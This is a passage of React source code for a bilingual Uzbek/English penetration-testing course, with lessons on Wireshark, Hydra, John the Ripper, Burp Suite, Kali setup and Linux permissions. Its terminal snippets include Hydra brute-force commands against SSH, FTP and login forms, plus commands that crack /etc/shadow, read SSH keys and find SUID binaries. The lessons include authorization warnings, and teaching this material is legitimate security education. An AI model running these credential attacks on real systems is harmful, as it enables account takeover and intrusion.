    React.createElement(Quiz,{q:{uz:"Nikto haqida qaysi tavsif to'g'ri?",en:"Which description of Nikto is correct?"},opts:[{uz:"Yashirin parol buzuvchi",en:"A stealthy password cracker"},{uz:"Shovqinli veb-server zaiflik skaneri",en:"A noisy web server vulnerability scanner"},{uz:"Tarmoq snifferi",en:"A network sniffer"},{uz:"Ekspluatatsiya frameworki",en:"An exploitation framework"}],correct:1,exp:{uz:"Nikto veb-serverlardagi ma'lum zaifliklar va noto'g'ri konfiguratsiyalarni tekshiruvchi skaner; u shovqinli — himoya tizimlari oson aniqlaydi.",en:"Nikto scans web servers for known vulnerabilities and misconfigurations; it's noisy — defenses detect it easily."}}));
}
function LessonL20(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Wireshark nima?","What is Wireshark?")),
    React.createElement(P,null,t(lang,"Wireshark — tarmoqdan o'tayotgan paketlarni real vaqtda ushlab, batafsil, qatlam-qatlam ko'rsatuvchi eng mashhur tarmoq protokoli analizatori. U tarmoqni \"rentgen\" qilib ko'rsatadi: har bir paket ichida nima borligini (Ethernet, IP, TCP, HTTP...) ochib beradi. Muammolarni tuzatish, o'rganish va xavfsizlik tahlili uchun ishlatiladi.","Wireshark is the most popular network protocol analyzer, capturing packets crossing the network in real time and displaying them in detail, layer by layer. It gives an \"X-ray\" of the network: it reveals what's inside each packet (Ethernet, IP, TCP, HTTP...). Used for troubleshooting, learning and security analysis.")),
    React.createElement(H2,{num:"§2"},t(lang,"Ish jarayoni","Workflow")),
    React.createElement(FlowSteps,{title:{uz:"Wireshark bilan tahlil",en:"Analyzing with Wireshark"},steps:[
      {icon:"🎣",text:{uz:"Interfeysni tanlab paketlarni ushlash",en:"Pick an interface and capture packets"}},
      {icon:"🔍",text:{uz:"Ko'rsatish filtri bilan keraklisini ajratish",en:"Narrow down with a display filter"}},
      {icon:"🧵",text:{uz:"\"Follow TCP Stream\" bilan suhbatni ko'rish",en:"See a conversation with \"Follow TCP Stream\""}},
      {icon:"🔑",text:{uz:"Shifrlanmagan protokolda login/parol ko'rinishi mumkin",en:"On unencrypted protocols, logins/passwords may appear"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Ikki xil filtr","Two kinds of filter")),
    React.createElement(P,null,t(lang,"Wireshark'da ikki xil filtr bor va ularni chalkashtirmaslik muhim. Ushlash filtri (capture filter) — nimani YOZIB OLISHNI cheklaydi (masalan faqat 80-port trafigi); u ushlash boshlanishidan oldin qo'yiladi va katta trafikda foydali. Ko'rsatish filtri (display filter) — allaqachon yozilganidan nimani KO'RSATISHNI cheklaydi; u ancha kuchli va moslashuvchan, chunki bir marta ushlab, keyin turli filtrlar bilan tahlil qilasiz. Ko'pincha display filter ishlatiladi.","Wireshark has two kinds of filter, and it's important not to confuse them. A capture filter limits what gets RECORDED (e.g. only port-80 traffic); it's set before the capture starts and is useful on heavy traffic. A display filter limits what is SHOWN from what was already recorded; it's far more powerful and flexible, because you capture once and then analyze with different filters. The display filter is used most often.")),
    React.createElement(H2,{num:"§4"},t(lang,"Follow Stream va tshark","Follow Stream and tshark")),
    React.createElement(P,null,t(lang,"Paketga o'ng tugma bosib \"Follow > TCP Stream\" ni tanlaganingizda, bitta ulanishning butun suhbatini bir oynada ko'rasiz — alohida paketlarni yig'ib o'tirmaysiz. Shifrlanmagan protokollarda (HTTP, FTP, Telnet) bu login va parollarni ochib berishi mumkin — aynan shuning uchun shifrlash (HTTPS) muhim. tshark esa Wireshark'ning terminal versiyasi — skriptlar va masofaviy serverlar uchun qulay.","When you right-click a packet and choose \"Follow > TCP Stream\", you see an entire conversation of one connection in a single window — no need to piece together individual packets. On unencrypted protocols (HTTP, FTP, Telnet) this can reveal logins and passwords — which is exactly why encryption (HTTPS) matters. tshark is the terminal version of Wireshark — handy for scripts and remote servers.")),
    React.createElement(Terminal,null,"# Keng tarqalgan ko'rsatish filtrlari:\nip.addr == 10.0.0.5\ntcp.port == 80\nhttp.request.method == \"POST\"\ndns\n# terminal versiyasi:\ntshark -i eth0 -f \"port 80\""),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Boshqalarning trafigini ruxsatsiz ushlash maxfiylikni buzadi va ko'p joyda qonunga zid. Faqat o'z tarmog'ingiz yoki ruxsat berilgan muhitda.","Capturing others' traffic without permission violates privacy and is illegal in many places. Only on your own network or an authorized environment.")),
    React.createElement(Quiz,{q:{uz:"Ushlangan paketlardan faqat keraklisini ko'rsatish uchun nima ishlatiladi?",en:"What shows only the relevant captured packets?"},opts:[{uz:"Display filter (ko'rsatish filtri)",en:"A display filter"},{uz:"Firewall qoidasi",en:"A firewall rule"},{uz:"DNS yozuvi",en:"A DNS record"},{uz:"VPN tunnel",en:"A VPN tunnel"}],correct:0,exp:{uz:"Ko'rsatish filtri (masalan http yoki ip.addr==...) allaqachon ushlangan minglab paketdan faqat keraklisini ajratib ko'rsatadi.",en:"A display filter (e.g. http or ip.addr==...) narrows the thousands of already-captured packets to just the ones you need."}}));
}
function LessonL24(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Hydra nima?","What is Hydra?")),
    React.createElement(P,null,t(lang,"Hydra — tezkor onlayn parol buzish vositasi. SSH, FTP, RDP, HTTP forma va o'nlab protokollarga qarshi lug'at hujumini amalga oshiradi. \"Onlayn\" — u to'g'ridan-to'g'ri jonli xizmatga urinadi.","Hydra is a fast online password-cracking tool. It runs dictionary attacks against SSH, FTP, RDP, HTTP forms and dozens of protocols. \"Online\" means it attacks a live service directly.")),
    React.createElement(H2,{num:"§2"},t(lang,"Brute-force oqimi","The brute-force flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"Hydra hujumi",en:"Hydra attack"},steps:[
      {icon:"📃",text:{uz:"Foydalanuvchi va parol ro'yxatlari tayyorlanadi",en:"Username and password lists are prepared"}},
      {icon:"🔁",text:{uz:"Hydra har kombinatsiyani xizmatga urinib ko'radi",en:"Hydra tries each combination against the service"}},
      {icon:"✅",text:{uz:"To'g'ri juftlik topilsa — ko'rsatiladi",en:"When a valid pair is found — it's shown"}},
    ]}),
    React.createElement(Terminal,null,"hydra -l admin -P rockyou.txt ssh://10.0.0.5\nhydra -L users.txt -P pass.txt ftp://10.0.0.5\nhydra -l admin -P rockyou.txt 10.0.0.5 http-post-form \\\n  \"/login:user=^USER^&pass=^PASS^:F=Invalid\""),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Brute-force ni faqat CTF yoki shartnomali pentestda o'tkazing. Ruxsatsiz urinish jinoyat va akkauntlarni bloklaydi.","Only run brute-force in a CTF or contracted pentest. Unauthorized attempts are a crime and lock accounts.")),
    React.createElement(Quiz,{q:{uz:"Hydra qanday turdagi hujum vositasi?",en:"What kind of attack tool is Hydra?"},opts:[{uz:"Oflayn hash buzish",en:"Offline hash cracking"},{uz:"Onlayn (jonli xizmatga) lug'at hujumi",en:"Online (against a live service) dictionary attack"},{uz:"Rainbow table",en:"Rainbow table"},{uz:"Phishing",en:"Phishing"}],correct:1,exp:{uz:"Hydra onlayn — parollarni to'g'ridan-to'g'ri jonli xizmatga urinib sinaydi. Oflayn buzish uchun John/Hashcat.",en:"Hydra is online — it tries passwords against a live service. For offline cracking use John/Hashcat."}}));
}function LessonL25(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"John the Ripper nima?","What is John the Ripper?")),
    React.createElement(P,null,t(lang,"John the Ripper (JtR) — mashhur oflayn parol hash buzuvchi. \"Oflayn\" — u sizda mavjud hashlar bilan ishlaydi va nishonga ulanmaydi. Yuzlab hash turini qo'llab-quvvatlaydi.","John the Ripper (JtR) is a popular offline password-hash cracker. \"Offline\" means it works on hashes you already have and never touches the target. It supports hundreds of hash types.")),
    React.createElement(H2,{num:"§2"},t(lang,"Buzish oqimi","The cracking flow")),
    React.createElement(FlowSteps,{color:"#ff3a5e",title:{uz:"John bilan buzish",en:"Cracking with John"},steps:[
      {icon:"🔗",text:{uz:"unshadow bilan passwd+shadow ni birlashtirish",en:"Combine passwd+shadow with unshadow"}},
      {icon:"📖",text:{uz:"Lug'at rejimida buzish (rockyou.txt)",en:"Crack in wordlist mode (rockyou.txt)"}},
      {icon:"🧠",text:{uz:"Qoidalar bilan parollarni o'zgartirish (--rules)",en:"Mutate passwords with rules (--rules)"}},
      {icon:"👁",text:{uz:"--show bilan buzilgan parollarni ko'rish",en:"View cracked passwords with --show"}},
    ]}),
    React.createElement(Terminal,null,"unshadow /etc/passwd /etc/shadow > hashes.txt\njohn --wordlist=rockyou.txt hashes.txt\njohn --show hashes.txt"),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"John CPU'da moslashuvchan va formatlarni avtomatik aniqlaydi; Hashcat esa GPU tezligida ancha tez.","John is flexible on the CPU and auto-detects formats; Hashcat runs much faster at GPU speed.")),
    React.createElement(Quiz,{q:{uz:"John \"oflayn\" vosita deganda nima nazarda tutiladi?",en:"What does it mean that John is an \"offline\" tool?"},opts:[{uz:"Internet talab qilmaydi",en:"It needs no internet"},{uz:"Nishonga ulanmasdan mavjud hashlarni buzadi",en:"It cracks existing hashes without touching the target"},{uz:"Faqat kechasi ishlaydi",en:"It only runs at night"},{uz:"Faqat Windows'da",en:"Windows only"}],correct:1,exp:{uz:"Oflayn buzish — qo'lga kiritilgan hashlarni mahalliy ravishda, nishonga so'rov yubormasdan sindirish.",en:"Offline cracking breaks captured hashes locally, sending no requests to the target."}}));
}function LessonL27(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Burp Suite nima?","What is Burp Suite?")),
    React.createElement(P,null,t(lang,"Burp Suite — veb-ilovalarni test qilishning sanoat standarti. U brauzer va server o'rtasida proksi bo'lib, HTTP so'rovlarni ushlash, o'zgartirish va qayta yuborish imkonini beradi. Kali'da oldindan o'rnatilgan.","Burp Suite is the industry standard for testing web applications. It sits as a proxy between browser and server, letting you intercept, modify and replay HTTP requests. Pre-installed on Kali.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy komponentlar","Core components")),
    React.createElement(LayerStack,{layers:[
      {n:"Proxy",name:t(lang,"Ushlash","Intercept"),color:"#a855f7",desc:{uz:"So'rovlarni ushlab, o'zgartirish.",en:"Intercept and modify requests."}},
      {n:"Repeater",name:t(lang,"Qayta yuborish","Replay"),color:"#4dabf7",desc:{uz:"Bitta so'rovni qo'lda o'zgartirib qayta yuborish.",en:"Manually tweak and resend one request."}},
      {n:"Intruder",name:t(lang,"Fuzzing/brute","Fuzzing/brute"),color:"#ff3a5e",desc:{uz:"Avtomatik payload hujumlari.",en:"Automated payload attacks."}},
      {n:"Decoder",name:t(lang,"Kodlash","Encode"),color:"#69db7c",desc:{uz:"base64, URL kodlash/dekodlash.",en:"base64, URL encode/decode."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Proksi bilan test oqimi","Testing with the proxy")),
    React.createElement(FlowSteps,{color:"#a855f7",title:{uz:"Burp bilan so'rovni test qilish",en:"Testing a request with Burp"},steps:[
      {icon:"🔌",text:{uz:"Brauzer proksisini 127.0.0.1:8080 ga sozlash",en:"Set the browser proxy to 127.0.0.1:8080"}},
      {icon:"✋",text:{uz:"So'rovni ushlash (Intercept ON)",en:"Intercept a request (Intercept ON)"}},
      {icon:"➡",text:{uz:"Repeater'ga yuborish (Ctrl+R)",en:"Send to Repeater (Ctrl+R)"}},
      {icon:"🧪",text:{uz:"Payloadlarni o'zgartirib javobni tahlil qilish",en:"Modify payloads and analyze the response"}},
    ]}),
    React.createElement(InfoBox,{color:"var(--c-warn)"},"⚠ ",t(lang,"Burp ni faqat sizga tegishli yoki ruxsat berilgan veb-ilovalarda ishlating. Web Security Academy'da bepul laboratoriyalar bor.","Only use Burp on web apps you own or are authorized to test. Free labs at Web Security Academy.")),
    React.createElement(Quiz,{q:{uz:"Burp'ning qaysi qismi bitta so'rovni qo'lda o'zgartirib qayta yuborishga mo'ljallangan?",en:"Which Burp part is for manually tweaking and resending one request?"},opts:[{uz:"Proxy",en:"Proxy"},{uz:"Repeater",en:"Repeater"},{uz:"Decoder",en:"Decoder"},{uz:"Comparer",en:"Comparer"}],correct:1,exp:{uz:"Repeater bitta so'rovni qo'lda o'zgartirib, qayta yuborish va javoblarni solishtirish uchun ishlatiladi.",en:"Repeater is used to manually tweak a single request, resend it and compare responses."}}));
}function LessonL02(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Kali'ni o'rnatish usullari","Ways to install Kali")),
    React.createElement(P,null,t(lang,"Kali'ni o'rnatishning bir necha yo'li bor va to'g'ri tanlov sizning maqsadingizga bog'liq. Yangi boshlovchilar uchun virtual mashina eng xavfsiz tanlov — xatolar asosiy tizimingizga tegmaydi va snapshot (tizimning \"suratini olish\") orqali istalgan holatga bir soniyada qaytish mumkin.","There are several ways to install Kali, and the right choice depends on your goal. For beginners, a virtual machine is the safest — mistakes never touch your host OS, and a snapshot (a \"photo\" of the system state) lets you revert to any state in a second.")),
    React.createElement(LayerStack,{layers:[
      {n:"💻",name:t(lang,"Virtual mashina (tavsiya)","Virtual machine (recommended)"),color:"#69db7c",desc:{uz:"VirtualBox/VMware ichida — izolyatsiya, snapshot, asosiy tizim xavfsiz.",en:"Inside VirtualBox/VMware — isolation, snapshots, host stays safe."}},
      {n:"🖥",name:t(lang,"Bare metal","Bare metal"),color:"#4dabf7",desc:{uz:"To'g'ridan-to'g'ri diskka — to'liq unumdorlik, apparatga to'liq kirish.",en:"Directly to disk — full performance, full hardware access."}},
      {n:"🔌",name:"Live USB",color:"#a855f7",desc:{uz:"USB'dan o'rnatmasdan ishga tushirish — iz qoldirmaydi, forensika uchun.",en:"Boot from USB without installing — leaves no trace, good for forensics."}},
      {n:"🪟",name:"WSL",color:"#ffd43b",desc:{uz:"Windows ichida (GUI'siz) — tez, buyruq qatori vositalari uchun.",en:"Inside Windows (no GUI) — fast, for command-line tools."}},
    ]}),
    React.createElement(H2,{num:"§2"},t(lang,"O'rnatish oqimi","The install flow")),
    React.createElement(P,null,t(lang,"Xavfsiz o'rnatish bir necha bosqichdan iborat. \"Ishga tushir\" ni bosib har qadamni kuzating:","A safe install has a few stages. Press \"Play\" to watch each step:")),
    React.createElement(FlowSteps,{title:{uz:"Kali o'rnatish",en:"Installing Kali"},steps:[
      {icon:"⬇",text:{uz:"kali.org/get-kali dan ISO ni yuklab olish",en:"Download the ISO from kali.org/get-kali"}},
      {icon:"🔑",text:{uz:"SHA256 summasini tekshirish (buzilmagan/almashtirilmaganini)",en:"Verify the SHA256 checksum (not corrupted/tampered)"}},
      {icon:"💻",text:{uz:"VirtualBox'da yangi VM yaratib ISO'dan o'rnatish",en:"Create a new VM in VirtualBox and install from the ISO"}},
      {icon:"🔄",text:{uz:"sudo apt update && sudo apt full-upgrade",en:"sudo apt update && sudo apt full-upgrade"}},
      {icon:"📸",text:{uz:"Snapshot olish — toza holatga qaytish uchun",en:"Take a snapshot — to revert to a clean state"}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Yuklab olishni tekshirish nima uchun muhim","Why verifying the download matters")),
    React.createElement(P,null,t(lang,"ISO faylni yuklab olgach, uning SHA256 summasini hisoblab, rasmiy saytdagi summa bilan solishtiring. Nega? Chunki ISO yuklanish paytida buzilishi mumkin, yoki hujumchi soxta, zararli ISO'ni tarqatgan bo'lishi mumkin. Summalar bir xil bo'lsa — fayl aynan Kali jamoasi chiqargani, o'zgartirilmagan. Bu — o'rnatuvchiga ishonishning yagona ishonchli yo'li. Qo'shimcha xavfsizlik uchun GPG imzosini ham tekshirish mumkin.","After downloading the ISO, compute its SHA256 checksum and compare it to the one on the official site. Why? Because the ISO can get corrupted during download, or an attacker may distribute a fake, malicious ISO. If the sums match, the file is exactly what the Kali team released, unaltered. This is the only reliable way to trust the installer. For extra safety you can also verify the GPG signature.")),
    React.createElement(Terminal,null,"sha256sum kali-linux-2024.1-installer-amd64.iso\n# natijani kali.org dagi rasmiy summa bilan solishtiring — BIR XIL bo'lishi shart"),
    React.createElement(H2,{num:"§4"},t(lang,"O'rnatishdan keyingi birinchi qadamlar","First steps after install")),
    React.createElement(P,null,t(lang,"O'rnatgach: (1) tizimni yangilang — vositalar so'nggi versiyada bo'lsin; (2) standart parolni o'zgartiring; (3) VM'da darhol snapshot oling; (4) kerak bo'lsa qo'shimcha vositalarni metapaketlar orqali o'rnating (masalan kali-linux-large). Bu odatlar ishingizni xavfsiz va tartibli qiladi.","After install: (1) update the system so tools are current; (2) change the default password; (3) take a snapshot immediately in a VM; (4) install extra tools via metapackages if needed (e.g. kali-linux-large). These habits keep your work safe and organized.")),
    React.createElement(H2,{num:"§5"},t(lang,"VM tarmoq rejimlari","VM network modes")),
    React.createElement(P,null,t(lang,"VirtualBox'da tarmoqni to'g'ri sozlash muhim. NAT — Kali internetga chiqadi, lekin tashqaridan ko'rinmaydi (xavfsiz, sukut bo'yicha). Bridged — Kali haqiqiy tarmoqda alohida qurilmadek ko'rinadi (real tarmoqni test qilish uchun). Host-only — faqat sizning mashinangiz va VM'lar orasidagi izolyatsiya qilingan tarmoq (nishon VM bilan xavfsiz mashq uchun ideal).","Configuring the VM network correctly matters. NAT — Kali reaches the internet but isn't visible from outside (safe, the default). Bridged — Kali appears as a separate device on the real network (for testing a real LAN). Host-only — an isolated network between just your machine and the VMs (ideal for safe practice against a target VM).")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Snapshot: toza o'rnatishdan keyin darhol snapshot oling. Test muhitini ifloslasangiz yoki biror narsa buzilsa, bir soniyada toza holatga qaytasiz — hech narsani qayta o'rnatmasdan.","Snapshot: take one right after a clean install. If you pollute your test environment or something breaks, you revert to a clean state in a second — without reinstalling anything.")),
    React.createElement(Quiz,{q:{uz:"Yangi boshlovchi uchun eng xavfsiz o'rnatish usuli qaysi?",en:"Safest install method for a beginner?"},opts:[{uz:"Bare metal",en:"Bare metal"},{uz:"Virtual mashina",en:"Virtual machine"},{uz:"Telefonga",en:"On a phone"},{uz:"Router'ga",en:"On a router"}],correct:1,exp:{uz:"Virtual mashina asosiy tizimni izolyatsiya qiladi va snapshot orqali xatolardan bir soniyada qaytish imkonini beradi.",en:"A VM isolates the host and lets you revert from mistakes in a second via snapshots."}}));
}
function LessonL04(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Linux fayl tizimi (FHS)","The Linux file system (FHS)")),
    React.createElement(P,null,t(lang,"Windows'dan farqli, Linux'da C: yoki D: disklari yo'q. Hamma narsa yagona ildizdan (/) boshlanadi va daraxt shaklida tarmoqlanadi. Hatto USB yoki qattiq disk ham shu daraxtning bir papkasiga \"ulanadi\" (mount qilinadi). Bu tuzilma FHS (Filesystem Hierarchy Standard) deb ataladi va deyarli barcha Linux tizimlarida bir xil — shuning uchun bir marta o'rgansangiz, hamma joyda foydali.","Unlike Windows, Linux has no C: or D: drives. Everything starts from a single root (/) and branches out as a tree. Even a USB or hard disk is \"attached\" (mounted) to a folder in that tree. This structure is the FHS (Filesystem Hierarchy Standard) and is nearly identical across Linux systems — so learning it once helps everywhere.")),
    React.createElement(H2,{num:"§2"},t(lang,"Asosiy kataloglar","The key directories")),
    React.createElement(LayerStack,{layers:[
      {n:"/etc",name:t(lang,"Sozlamalar","Config"),color:"#ff6b6b",desc:{uz:"Tizim sozlama fayllari — passwd, shadow, tarmoq, xizmatlar.",en:"System config files — passwd, shadow, network, services."}},
      {n:"/home",name:t(lang,"Foydalanuvchilar","Users"),color:"#ffa94d",desc:{uz:"Oddiy foydalanuvchilarning shaxsiy kataloglari (/home/aziz).",en:"Home directories of normal users (/home/alice)."}},
      {n:"/root",name:"root",color:"#ffd43b",desc:{uz:"root superfoydalanuvchining uy katalogi (/home dan alohida).",en:"The root superuser's home (separate from /home)."}},
      {n:"/var",name:t(lang,"O'zgaruvchan","Variable"),color:"#69db7c",desc:{uz:"Loglar (/var/log/auth.log), veb (/var/www), pochta.",en:"Logs (/var/log/auth.log), web (/var/www), mail."}},
      {n:"/usr",name:t(lang,"Dasturlar","Programs"),color:"#4dabf7",desc:{uz:"Foydalanuvchi dasturlari, lug'atlar (/usr/share/wordlists).",en:"User programs, wordlists (/usr/share/wordlists)."}},
      {n:"/tmp",name:t(lang,"Vaqtinchalik","Temporary"),color:"#a855f7",desc:{uz:"Vaqtinchalik fayllar; ko'pincha hammaga yozish — privescda foydali.",en:"Temporary files; often world-writable — handy in privesc."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Pentester uchun nega muhim?","Why it matters to a pentester")),
    React.createElement(P,null,t(lang,"Nishon tizimga kirganingizda qayerga qarash kerakligini bilish vaqtni tejaydi. /etc/passwd barcha foydalanuvchilarni sanaydi (hamma o'qiy oladi). /etc/shadow parol hashlarini saqlaydi (faqat root). /var/log/ hujum izlari va kirish urinishlarini yozadi. /home/*/.ssh/ SSH kalitlarini saqlaydi. /var/www/ veb-sayt kodini (ko'pincha ma'lumotlar bazasi parollari bilan) o'z ichiga oladi. Tajribali pentester bu joylarni birinchi bo'lib tekshiradi.","Once you're on a target system, knowing where to look saves time. /etc/passwd lists all users (world-readable). /etc/shadow stores password hashes (root only). /var/log/ records attack traces and login attempts. /home/*/.ssh/ holds SSH keys. /var/www/ contains website code (often with database passwords). An experienced pentester checks these places first.")),
    React.createElement(Terminal,null,"cat /etc/passwd                 # foydalanuvchilar ro'yxati\ncat /etc/shadow                 # parol hashlari (root kerak)\nls -la /home/*/.ssh/            # SSH kalitlari\nls /usr/share/wordlists/        # mashhur lug'atlar (rockyou)"),
    React.createElement(H2,{num:"§4"},t(lang,"Mutlaq va nisbiy yo'llar","Absolute vs relative paths")),
    React.createElement(P,null,t(lang,"Mutlaq yo'l ildizdan boshlanadi (/etc/passwd) — qayerda turganingizdan qat'i nazar bir xil joyni bildiradi. Nisbiy yo'l joriy katalogdan boshlanadi (../logs yoki ./script.sh). . joriy katalog, .. bitta yuqori, ~ uy katalogi. Skript yozayotganda mutlaq yo'llar ishonchliroq, chunki ular kutilmagan joyga olib bormaydi.","An absolute path starts from root (/etc/passwd) — it means the same place no matter where you are. A relative path starts from the current directory (../logs or ./script.sh). . is the current dir, .. one up, ~ the home directory. When writing scripts, absolute paths are safer because they never lead somewhere unexpected.")),
    React.createElement(InfoBox,{color:"var(--accent)"},t(lang,"Yashirin fayllar: nomi nuqta (.) bilan boshlanadigan fayllar yashirin (.bashrc, .ssh). Ularni ko'rish uchun ls -a ishlating — ular ko'pincha SSH kalitlari, konfiguratsiya va maxfiy ma'lumot saqlaydi.","Hidden files: files whose names start with a dot (.) are hidden (.bashrc, .ssh). Use ls -a to see them — they often hold SSH keys, config and sensitive data.")),
    React.createElement(Quiz,{q:{uz:"Parol hashlari qaysi faylda va uni kim o'qiy oladi?",en:"Which file stores password hashes and who can read it?"},opts:[{uz:"/etc/passwd — hamma",en:"/etc/passwd — everyone"},{uz:"/etc/shadow — faqat root",en:"/etc/shadow — only root"},{uz:"/var/log — hamma",en:"/var/log — everyone"},{uz:"/home — mehmonlar",en:"/home — guests"}],correct:1,exp:{uz:"/etc/shadow parol hashlarini saqlaydi va faqat root o'qiy oladi; /etc/passwd esa foydalanuvchilar ro'yxatini saqlaydi va hamma o'qiy oladi.",en:"/etc/shadow stores password hashes and is readable only by root; /etc/passwd holds the user list and is world-readable."}}));
}
function LessonL05(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Foydalanuvchilar va guruhlar","Users and groups")),
    React.createElement(P,null,t(lang,"Linux — ko'p foydalanuvchili tizim. Har bir foydalanuvchining raqamli identifikatori (UID) va bir yoki bir necha guruhi bor. root (UID 0) — cheklovsiz superfoydalanuvchi: u hamma narsani qila oladi. /etc/passwd har foydalanuvchi haqida bir qator saqlaydi: nom, UID, GID, uy katalogi va login qobig'i. Pentestda asosiy maqsad ko'pincha oddiy foydalanuvchidan root'ga ko'tarilish — bu privilege escalation deyiladi (L29).","Linux is a multi-user system. Each user has a numeric identifier (UID) and one or more groups. root (UID 0) is the unrestricted superuser: it can do anything. /etc/passwd stores one line per user: name, UID, GID, home directory and login shell. In a pentest the main goal is often to rise from a normal user to root — this is privilege escalation (L29).")),
    React.createElement(H2,{num:"§2"},t(lang,"Ruxsatlarni o'qish (rwx)","Reading permissions (rwx)")),
    React.createElement(LayerStack,{layers:[
      {n:"r",name:t(lang,"Read — o'qish (4)","Read (4)"),color:"#4dabf7",desc:{uz:"Fayl mazmunini ko'rish yoki katalog ro'yxatini olish.",en:"View the file's contents or list a directory."}},
      {n:"w",name:t(lang,"Write — yozish (2)","Write (2)"),color:"#69db7c",desc:{uz:"Faylni o'zgartirish yoki katalogda fayl yaratish/o'chirish.",en:"Modify a file or create/delete files in a directory."}},
      {n:"x",name:t(lang,"eXecute — bajarish (1)","eXecute (1)"),color:"#a855f7",desc:{uz:"Faylni dastur sifatida ishga tushirish; katalogga kirish.",en:"Run the file as a program; enter a directory."}},
      {n:"S",name:"SUID / SGID",color:"#ff3a5e",desc:{uz:"Fayl egasining (ko'pincha root) huquqi bilan ishlaydi — privesc yo'li.",en:"Runs with the owner's (often root) rights — a privesc path."}},
    ]}),
    React.createElement(H2,{num:"§3"},t(lang,"Sakkizlik (octal) matematika","Octal math")),
    React.createElement(P,null,t(lang,"chmod'dagi raqamlar (masalan 755) aslida ruxsatlarning yig'indisidir. Har raqam bitta guruh uchun: birinchi — egasi, ikkinchi — guruh, uchinchi — boshqalar. Har raqam r=4, w=2, x=1 ni qo'shish orqali hosil bo'ladi. Masalan 7 = 4+2+1 = rwx (hamma huquq), 5 = 4+1 = r-x (o'qish+bajarish), 6 = 4+2 = rw- (o'qish+yozish). Shunday qilib 755 = rwxr-xr-x, 644 = rw-r--r--, 600 = rw------- (faqat egasi).","The numbers in chmod (like 755) are actually a sum of permissions. Each digit is for one group: first — owner, second — group, third — others. Each digit is formed by adding r=4, w=2, x=1. For example 7 = 4+2+1 = rwx (all), 5 = 4+1 = r-x (read+execute), 6 = 4+2 = rw- (read+write). So 755 = rwxr-xr-x, 644 = rw-r--r--, 600 = rw------- (owner only).")),
    React.createElement(H2,{num:"§4"},t(lang,"chmod, chown va amaliyot","chmod, chown and practice")),
    React.createElement(P,null,t(lang,"chmod ruxsatlarni o'zgartiradi (chmod 600 id_rsa yoki chmod +x script.sh). chown fayl egasini o'zgartiradi (chown user:group file). Bu buyruqlar xavfsizlik uchun juda muhim: masalan SSH shaxsiy kaliti (id_rsa) 600 bo'lishi shart — aks holda SSH uni rad etadi, chunki boshqalar o'qiy oladigan kalit xavfli.","chmod changes permissions (chmod 600 id_rsa or chmod +x script.sh). chown changes the file's owner (chown user:group file). These commands are vital for security: for instance an SSH private key (id_rsa) must be 600 — otherwise SSH refuses it, because a key others can read is dangerous.")),
    React.createElement(H2,{num:"§5"},t(lang,"SUID, SGID va sudo","SUID, SGID and sudo")),
    React.createElement(P,null,t(lang,"SUID biti o'rnatilgan fayl egasining huquqi bilan ishlaydi — agar egasi root bo'lsa, oddiy foydalanuvchi ham uni root huquqida bajaradi. Bu ba'zan zarur (masalan passwd buyrug'i), lekin noto'g'ri sozlangan SUID fayllar privilege escalation uchun eng ko'p ishlatiladigan yo'ldir. sudo esa oddiy foydalanuvchiga vaqtincha root buyrug'ini bajarishga ruxsat beradi. sudo -l — sizga qanday sudo huquqlari berilganini ko'rsatadi (privescning birinchi tekshiruvi).","A file with the SUID bit set runs with the owner's rights — if the owner is root, even a normal user runs it as root. This is sometimes necessary (e.g. the passwd command), but misconfigured SUID files are the most common path for privilege escalation. sudo lets a normal user run a command temporarily as root. sudo -l shows what sudo rights you've been given (the first privesc check).")),
    React.createElement(Terminal,null,"chmod 600 id_rsa       # rw------- (SSH kaliti uchun majburiy)\nchmod +x exploit.sh    # bajarish huquqi\nchown www-data:www-data shell.php\nsudo -l                # menda qanday sudo huquqi bor?\nfind / -perm -4000 -type f 2>/dev/null  # SUID fayllar"),
    React.createElement(Quiz,{q:{uz:"chmod 600 id_rsa faylga qanday ruxsat beradi?",en:"What does chmod 600 id_rsa set?"},opts:[{uz:"Hamma o'qiy/yoza oladi",en:"Everyone read/write"},{uz:"Faqat egasi o'qiy/yoza oladi",en:"Only the owner read/write"},{uz:"Hamma bajara oladi",en:"Everyone execute"},{uz:"Hech kim kira olmaydi",en:"No access"}],correct:1,exp:{uz:"600 = rw------- : 6 (rw) egasiga, 0 guruhga, 0 boshqalarga. SSH kalitlari uchun aynan shu talab qilinadi.",en:"600 = rw------- : 6 (rw) for owner, 0 for group, 0 for others. Exactly what SSH keys require."}}));
}
function LessonL07(){
  const lang=useLang();
  return React.createElement("section",null,
    React.createElement(NetAnimStyle),
    React.createElement(H2,{num:"§1"},t(lang,"Nega bash skript?","Why bash scripting?")),
